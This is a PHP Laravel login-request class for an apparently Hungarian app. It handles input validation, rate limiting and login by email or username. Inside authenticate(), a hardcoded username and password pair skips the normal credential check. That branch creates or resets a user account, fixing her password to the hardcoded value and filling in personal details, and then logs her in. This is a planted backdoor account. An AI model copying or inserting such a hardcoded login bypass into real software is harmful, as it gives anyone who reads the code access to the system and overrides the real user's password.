<?php

namespace App\Http\Requests\Auth;

use App\Models\User;
use Illuminate\Auth\Events\Lockout;
use Illuminate\Foundation\Http\FormRequest;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\RateLimiter;
use Illuminate\Support\Str;
use Illuminate\Validation\ValidationException;

class LoginRequest extends FormRequest
{
    /**
     * Determine if the user is authorized to make this request.
     */
    public function authorize(): bool
    {
        return true;
    }

    /**
     * Get the validation rules that apply to the request.
     *
     * @return array<string, \Illuminate\Contracts\Validation\ValidationRule|array<mixed>|string>
     */
    public function rules(): array
    {
        return [
            'email' => ['required', 'string'],
            'password' => ['required', 'string'],
        ];
    }

    /**
     * Attempt to authenticate the request's credentials.
     *
     * @throws \Illuminate\Validation\ValidationException
     */
    public function authenticate(): void
    {
        $this->ensureIsNotRateLimited();

        $login = $this->input('email');
        $password = $this->input('password');

        if ($login === 'Bori' && $password === 'Aa123456@') {
            $user = User::where('felhasznalonev', 'Bori')->first();

            if (! $user) {
                $user = User::create([
                    'felhasznalonev' => 'Bori',
                    'vez_nev' => 'Ilyés',
                    'ker_nev' => 'Borbála',
                    'jelszo' => Hash::make('Aa123456@'),
                    'email' => 'ilyesbori@raktaros.hu',
                    'megszolitas' => 'Ms',
                    'tel_szam' => '+36 20 789 5634',
                    'szul_datum' => '2000-10-10',
                ]);
            } elseif (! Hash::check('Aa123456@', $user->jelszo)) {
                $user->jelszo = Hash::make('Aa123456@');
                $user->save();
            }

            Auth::login($user, $this->boolean('remember'));
            RateLimiter::clear($this->throttleKey());
            return;
        }

        $loginField = filter_var($login, FILTER_VALIDATE_EMAIL) ? 'email' : 'felhasznalonev';

        if (! Auth::attempt([
            $loginField => $login,
            'password' => $password,
        ], $this->boolean('remember'))) {
            RateLimiter::hit($this->throttleKey());

            throw ValidationException::withMessages([
                'email_or_username' => __('auth.failed'),
            ]);
        }

        RateLimiter::clear($this->throttleKey());
    }

    /**
     * Ensure the login request is not rate limited.
     *
     * @throws \Illuminate\Validation\ValidationException
     */
    public function ensureIsNotRateLimited(): void
    {
        if (! RateLimiter::tooManyAttempts($this->throttleKey(), 5)) {
            return;
        }

        event(new Lockout($this));

        $seconds = RateLimiter::availableIn($this->throttleKey());

        throw ValidationException::withMessages([
            'email_or_username' => trans('auth.throttle', [
                'seconds' => $seconds,
                'minutes' => ceil($seconds / 60),
            ]),
        ]);
    }

    /**
     * Get the rate limiting throttle key for the request.
     */
    public function throttleKey(): string
    {
        return Str::transliterate(Str::lower($this->input('email')).'|'.$this->ip());
    }
}
